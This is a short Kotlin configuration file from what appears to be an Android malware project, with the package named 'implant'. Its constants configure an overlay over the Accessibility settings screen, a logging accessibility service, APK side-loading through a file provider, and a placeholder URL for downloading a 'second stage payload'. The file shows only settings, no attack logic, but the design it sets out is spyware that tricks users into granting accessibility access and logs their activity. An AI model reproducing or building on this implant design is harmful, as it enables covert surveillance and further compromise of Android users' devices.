package com.cooperthecoder.implant

object Config {
    val OVERLAY_DELAY: Long = 2000L
    val ACCESSIBILITY_SERVICE_CLASS = LoggingAccessibilityService::class.java
    val ACCESSIBILITY_SETTINGS_HEIGHT = 240
    val ACCESSIBILITY_SETTINGS_TOP_PADDING = 240
    val APK_CONTENT_TYPE: String = "application/vnd.android.package-archive"
    val FILE_PROVIDER_NAME: String = BuildConfig.APPLICATION_ID + ".package"
    val SECOND_STAGE_PAYLOAD_URL: String = "https://google.com"
}

